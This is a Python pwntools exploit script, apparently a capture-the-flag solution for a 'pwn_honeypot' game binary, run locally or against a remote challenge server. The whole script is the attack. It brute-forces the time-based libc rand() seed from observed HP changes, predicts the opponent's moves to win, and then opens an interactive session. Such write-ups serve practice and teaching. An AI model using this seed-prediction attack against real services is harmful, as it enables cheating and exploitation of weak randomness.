#!/usr/bin/env python
from pwn import *
from ctypes import CDLL

def firewall(option):
    # s.sendline('2')
    s.sendlineafter('option:', '2')
    # s.sendline(str(option))
    s.sendlineafter('Option: ', str(option))

def attack(option, sleep=None):
    # s.sendline('3')
    s.sendlineafter('option:', '3')
    if sleep:
        time.sleep(sleep)
    # s.sendline(str(option))
    s.sendlineafter('Option: ', str(option))

def get_hp():
    s.recvuntil("Player's HP     : ")
    player_hp = int(s.recvline(False))
    s.recvuntil("Hacker's HP       :")
    hacker_hp = int(s.recvline(False))
    return player_hp, hacker_hp

def rand(seed, index):
    libc.srand(seed)
    for _ in range(index):
        libc.rand()
    return libc.rand()

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

if len(sys.argv) == 1:
    s = process('./pwn_honeypot')
else:
    s = remote('206.81.24.129', 1340)

s.recvuntil('What')
now = int(time.time())

s.sendlineafter('name?\n', 'A')
player_hp, hacker_hp = get_hp()

firewall(1)
attack(-1, 1)
s.recvuntil('type ')
t = int(s.recvline(False)[:-1])
php, hhp = get_hp()

for i in range(0x1000):
    libc.srand(now - i)
    if libc.rand() % 0x1e != hacker_hp - hhp:
        continue
    if libc.rand() & 3 != t:
        continue
    diff = player_hp - php
    if t == 0 and ((libc.rand() % 5000) * 0x10000) % 100 != diff:
        continue
    if t == 1 and libc.rand() % 1000 != diff:
        continue
    if t == 2 and libc.rand() % 1000 != diff:
        continue
    log.info('Got seed')
    break

hacker_hp = hhp

p = log.progress("Hacker's HP")
while True:
    firewall(1)
    hacker_hp -= libc.rand() % 0x1e
    attack(libc.rand() & 3, 0.02)
    p.status('%d' % hacker_hp)
    if hacker_hp < 0:
        p.status('Won!')
        break

s.interactive()
